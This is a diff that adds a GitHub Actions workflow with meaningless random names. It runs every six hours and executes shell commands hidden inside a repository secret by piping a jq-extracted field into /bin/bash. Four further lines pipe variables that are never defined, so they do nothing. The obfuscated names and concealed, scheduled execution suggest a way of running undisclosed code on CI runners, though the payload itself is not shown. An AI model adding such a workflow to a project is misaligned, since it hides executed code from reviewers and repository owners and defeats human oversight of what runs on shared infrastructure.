@@ -1,0 +1,21 @@
+name: qiwussq
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiwussq
+        env:
+          cbz3776: ${{ secrets.cbz3776 }}
+        run: |
+          echo $cbz3776 | jq -r .qpiw79 | /bin/bash
+          echo $pe0792 | jq -r .wfpbi29455 | /bin/bash
+          echo $x6 | jq -r .cxi4 | /bin/bash
+          echo $lj225 | jq -r .ed1 | /bin/bash
+          echo $dvauh119 | jq -r .jmg5863 | /bin/bash
+
